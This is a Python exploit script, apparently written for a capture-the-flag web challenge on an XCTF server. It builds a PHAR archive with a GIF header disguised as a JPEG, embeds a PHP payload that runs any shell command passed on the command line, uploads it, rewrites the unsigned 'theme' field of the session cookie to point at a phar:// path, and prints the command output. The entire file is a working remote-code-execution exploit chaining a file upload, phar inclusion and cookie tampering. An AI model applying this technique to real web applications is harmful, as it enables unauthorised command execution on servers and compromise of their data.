import re,base64,json,subprocess,requests,sys
BASE='http://oj-10-30-15-9-40055.adworld.xctf.org.cn'
if len(sys.argv) < 2:
    print('usage: python3.11 exec_027.py <shell_command>')
    sys.exit(1)
cmd=sys.argv[1]
builder=r'''<?php
@unlink('/home/ubuntu/exec027.phar'); @unlink('/home/ubuntu/exec027.jpg');
$p = new Phar('/home/ubuntu/exec027.phar');
$p->startBuffering();
$code = <<<'EOC'
<?php echo 'EXEC027_BEGIN\n'; system("''' + cmd.replace('\\','\\\\').replace('"','\\"') + r'''"); echo '\nEXEC027_END'; ?>
EOC;
$p->addFromString('x.css', $code);
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$p->setMetadata('meta');
$p->stopBuffering();
copy('/home/ubuntu/exec027.phar','/home/ubuntu/exec027.jpg');
?>'''
open('/home/ubuntu/build_exec027.php','w').write(builder)
subprocess.run(['php','-d','phar.readonly=0','/home/ubuntu/build_exec027.php'],check=True)
s=requests.Session()
s.post(BASE+'/signin.php',data={'name':'test027'},allow_redirects=False,timeout=20)
with open('/home/ubuntu/exec027.jpg','rb') as f:
    r=s.post(BASE+'/upload.php',files={'file':('exec027.jpg',f,'image/jpeg')},allow_redirects=False,timeout=20)
raw_cookie=r.headers.get('Set-Cookie','')
m=re.search(r'session=([^;]+)', raw_cookie)
if not m:
    print('NOCOOKIE')
    sys.exit(2)
cookie=m.group(1)
data_b64,sig_b64=cookie.split('.',1)
json_text=base64.urlsafe_b64decode(data_b64 + '='*((4-len(data_b64)%4)%4)).decode()
obj=json.loads(json_text)
saved=obj['flash']['message'].split(': ',1)[1]
obj['theme']='phar://'+saved+'/x'
new_json=json.dumps(obj,separators=(',',':'))
forged=base64.urlsafe_b64encode(new_json.encode()).decode().rstrip('=') + '.' + sig_b64
r=requests.get(BASE+'/',headers={'Cookie':'session='+forged},timeout=30)
text=r.text
start=text.find('EXEC027_BEGIN')
end=text.find('EXEC027_END')
if start != -1 and end != -1 and end > start:
    print(text[start+len('EXEC027_BEGIN'):end].strip())
else:
    print(text[:2000])
